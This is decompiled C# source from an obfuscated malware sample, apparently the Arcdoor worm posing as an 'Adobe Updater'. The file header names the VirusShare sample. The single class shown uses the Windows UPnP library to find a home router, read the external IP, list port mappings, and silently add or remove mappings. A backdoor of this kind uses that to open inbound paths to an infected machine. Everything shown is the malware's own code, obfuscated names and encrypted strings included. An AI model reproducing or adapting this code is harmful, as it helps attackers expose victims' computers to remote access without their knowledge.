// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EBFD65F-C01D-4B08-A6E5-41C787EE6341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Worm.MSIL.Arcdoor.vps-5c5e242af096e77e0fc4a037a0fee5d20df072b9dc640e5ae36ec0f0f68ad065.exe

using System;
using System.Collections.Generic;
using System.Net;
using UPNPLib;

public static class \u0006\u2001
{
  private static IPAddress \u0002 = \u0002\u2000.\u0002(true);
  private static UPnPService \u0003 = (UPnPService) null;

  private static UPnPService \u0002(UPnPDevice _param0)
  {
    foreach (UPnPService service in (IUPnPServices) ((IUPnPDevice) _param0).Services)
    {
      if (\u0006\u2001.\u0002(service))
        return service;
      if (((IUPnPDevice) _param0).HasChildren)
        return \u0006\u2001.\u0002(((IUPnPDevice) _param0).Children);
    }
    return (UPnPService) null;
  }

  private static UPnPService \u0002(UPnPDevices _param0)
  {
    foreach (UPnPDevice upnPdevice in (IUPnPDevices) _param0)
    {
      UPnPService upnPservice = \u0006\u2001.\u0002(upnPdevice);
      if (upnPservice != null)
        return upnPservice;
    }
    return (UPnPService) null;
  }

  private static bool \u0002(UPnPService _param0) => ((IUPnPService) _param0).ServiceTypeIdentifier == \u000F\u2001.\u0002(670212814);

  public static bool \u0002(int _param0, string _param1)
  {
    if (\u0006\u2001.\u0003 == null)
      return false;
    object[] objArray = new object[3]
    {
      (object) string.Empty,
      (object) _param0,
      (object) _param1
    };
    object obj = new object();
    try
    {
      ((IUPnPService) \u0006\u2001.\u0003).InvokeAction(\u000F\u2001.\u0002(670212851), (object) objArray, ref obj);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool \u0002()
  {
    \u0006\u2001.\u0003 = (UPnPService) null;
    \u0006\u2001.\u0003 = \u0006\u2001.\u0002(((IUPnPDeviceFinder) Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid(\u000F\u2001.\u0002(670212635))))).FindByType(\u000F\u2001.\u0002(670212662), 0U));
    return \u0006\u2001.\u0003 != null;
  }

  public static string \u0002()
  {
    if (\u0006\u2001.\u0003 == null)
      return string.Empty;
    object obj1 = new object();
    object obj2 = new object();
    ((IUPnPService) \u0006\u2001.\u0003).InvokeAction(\u000F\u2001.\u0002(670212720), obj1, ref obj2);
    return (string) ((object[]) obj2)[0];
  }

  public static List<\u000E> \u0002()
  {
    if (\u0006\u2001.\u0003 == null)
      return (List<\u000E>) null;
    List<\u000E> objList = new List<\u000E>();
    bool flag = false;
    int num = 0;
    while (!flag)
    {
      object[] objArray1 = new object[1]{ (object) num };
      object obj = new object();
      try
      {
        ((IUPnPService) \u0006\u2001.\u0003).InvokeAction(\u000F\u2001.\u0002(670215579), (object) objArray1, ref obj);
        object[] objArray2 = (object[]) obj;
        ++num;
        objList.Add(new \u000E()
        {
          \u0002 = (ushort) objArray2[1],
          \u0003 = (ushort) objArray2[3],
          \u0005 = (string) objArray2[2],
          \u0008 = (string) objArray2[6]
        });
      }
      catch
      {
        flag = true;
      }
    }
    return objList;
  }

  public static bool \u0003(int _param0, string _param1)
  {
    if (\u0006\u2001.\u0003 == null)
      return false;
    object[] objArray = new object[3]
    {
      (object) string.Empty,
      (object) _param0,
      (object) _param1
    };
    object obj = new object();
    try
    {
      ((IUPnPService) \u0006\u2001.\u0003).InvokeAction(\u000F\u2001.\u0002(670215612), (object) objArray, ref obj);
      return true;
    }
    catch
    {
      return false;
    }
  }

  public static bool \u0002(int _param0, int _param1, string _param2, string _param3)
  {
    int num = 0;
    if (\u0006\u2001.\u0003 == null || \u0006\u2001.\u0003(_param0, _param2))
      return false;
    object[] objArray = new object[8]
    {
      (object) string.Empty,
      (object) _param0,
      (object) _param2,
      (object) _param1,
      (object) \u0006\u2001.\u0002.ToString(),
      (object) true,
      (object) _param3,
      (object) num
    };
    object obj = new object();
    try
    {
      ((IUPnPService) \u0006\u2001.\u0003).InvokeAction(\u000F\u2001.\u0002(670215646), (object) objArray, ref obj);
      return true;
    }
    catch
    {
      return false;
    }
  }
}
